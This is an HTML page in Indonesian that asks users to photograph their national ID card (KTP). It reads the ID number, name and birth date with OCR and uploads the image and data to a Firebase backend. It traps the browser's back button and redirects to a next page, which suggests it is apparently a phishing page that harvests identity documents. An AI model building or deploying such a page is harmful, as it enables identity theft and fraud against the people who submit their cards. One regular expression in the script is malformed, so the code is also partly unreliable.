<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifikasi KTP</title>

<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/tesseract.js@4/dist/tesseract.min.js"></script>

<style>
body{margin:0;background:#000;color:#fff;font-family:'Orbitron';text-align:center}

/* FRAME */
.frame{
 width:85%;max-width:420px;aspect-ratio:10/6;
 border:2mm solid #888;margin:20px auto;border-radius:10px;
 background:#111;display:flex;justify-content:center;align-items:center;position:relative;
}
.frame img{width:100%;height:100%;object-fit:cover;display:none}
.label{position:absolute;color:#00aaff;opacity:.7}

/* BUTTON */
.btn{
 width:85%;max-width:420px;padding:14px;margin:10px auto;
 background:linear-gradient(45deg,#d4af37,#ffd700);
 border:none;color:#000;font-weight:bold;border-radius:8px;
}

/* FORM */
.form{display:none}
.input{
 width:85%;max-width:420px;padding:10px;margin:5px auto;
 border-radius:6px;border:none;
}

/* CHECKBOX */
.checkbox{
 display:none;width:85%;max-width:420px;
 margin:10px auto;font-size:12px;text-align:left;
}

/* LOADING */
#loadingScreen{
 position:fixed;top:0;left:0;width:100%;height:100%;
 background:#000;display:none;justify-content:center;align-items:center;
 flex-direction:column;z-index:999;
}
.loader{
 border:5px solid #222;border-top:5px solid #00aaff;
 border-radius:50%;width:50px;height:50px;
 animation:spin 1s linear infinite;
}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}

</style>
</head>

<body>

<h2>VERIFIKASI KTP</h2>

<div class="frame">
 <img id="preview">
 <div class="label" id="label">FOTO KTP</div>
</div>

<button class="btn" onclick="ambilFoto()">AMBIL FOTO</button>

<div class="form" id="formOCR">
 <input class="input" id="nik" placeholder="NIK">
 <input class="input" id="nama" placeholder="Nama">
 <input class="input" id="ttl" placeholder="Tanggal / Bulan / Tahun" inputmode="numeric">
</div>

<div class="checkbox" id="box">
 <input type="checkbox" id="check" onchange="kirimOtomatis()">
 Data yang saya berikan sudah sesuai dengan Kartu Identitas saya.
</div>

<div id="notif"></div>

<!-- LOADING -->
<div id="loadingScreen">
 <div class="loader"></div>
 <p id="loadingText">Memproses Verifikasi... 0%</p>
</div>

<input type="file" id="cameraInput" accept="image/*" capture="environment" hidden>

<script type="module">

/* LOCK BACK */
history.pushState(null,null,location.href);
window.onpopstate=()=>history.go(1);

/* AUTO RESET */
window.onload=()=>{
 preview.style.display="none";
 label.style.display="block";
 formOCR.style.display="none";
 box.style.display="none";
};

/* FIREBASE */
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
import { getFirestore, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

const firebaseConfig={
 apiKey:"ISI_APIKEY",
 authDomain:"ISI.firebaseapp.com",
 projectId:"ISI",
 storageBucket:"ISI.appspot.com",
 appId:"ISI_APPID"
};

const app=initializeApp(firebaseConfig);
const storage=getStorage(app);
const db=getFirestore(app);

let fileBlob=null;

/* AMBIL FOTO */
window.ambilFoto=()=>cameraInput.click();

/* FORMAT TTL */
ttl.addEventListener("input",e=>{
 let v=e.target.value.replace(/\D/g,"").slice(0,8);
 e.target.value=v.replace(/(\d{2})(\d{2})(\d{4})/,"$1 / $2 / $3");
});

/* EXTRACT OCR */
function extract(t){
 t=t.replace(/\s+/g,' ');
 let nik=(t.match(/\b\d{16}\b)||[""])[0];
 let nama=((t.match(/NAMA\s*[:\-]?\s*([A-Z\s]+)/)||["",""])[1]).trim();
 let ttlRaw=t.match(/(\d{2})[\/\-]?(\d{2})[\/\-]?(\d{4})/);
 let ttl=ttlRaw?`${ttlRaw[1]} / ${ttlRaw[2]} / ${ttlRaw[3]}`:"";
 return {nik,nama,ttl};
}

/* HANDLE FOTO */
cameraInput.onchange=async e=>{
 const file=e.target.files[0];
 if(!file)return;

 fileBlob=file;

 preview.src=URL.createObjectURL(file);
 preview.style.display="block";
 label.style.display="none";

 loadingText.innerText="Memproses Verifikasi... 0%";
 loadingScreen.style.display="flex";

 const result=await Tesseract.recognize(preview.src,'ind+eng',{
  logger:m=>{
   if(m.status==="recognizing text"){
    loadingText.innerText="Memproses Verifikasi... "+Math.round(m.progress*100)+"%";
   }
  }
 });

 loadingScreen.style.display="none";

 const text=result.data.text.toUpperCase();
 const data=extract(text);

 nik.value=data.nik;
 nama.value=data.nama;
 ttl.value=data.ttl;

 formOCR.style.display="block";

 cekField();
};

/* CEK FIELD */
function cekField(){
 if(nik.value && nama.value && ttl.value){
  box.style.display="block";
 }
}

nik.oninput=cekField;
nama.oninput=cekField;
ttl.oninput=cekField;

/* KIRIM AUTO */
window.kirimOtomatis=async ()=>{
 if(!check.checked)return;

 notif.innerText="Uploading...";

 const fileName="ktp_"+Date.now()+".jpg";
 const storageRef=ref(storage,fileName);

 await uploadBytes(storageRef,fileBlob);

 await addDoc(collection(db,"verifikasi"),{
  nik:nik.value,
  nama:nama.value,
  tanggal_lahir:ttl.value,
  file:fileName,
  createdAt:serverTimestamp()
 });

 window.location.href="index3.html";
};

</script>

</body>
</html>
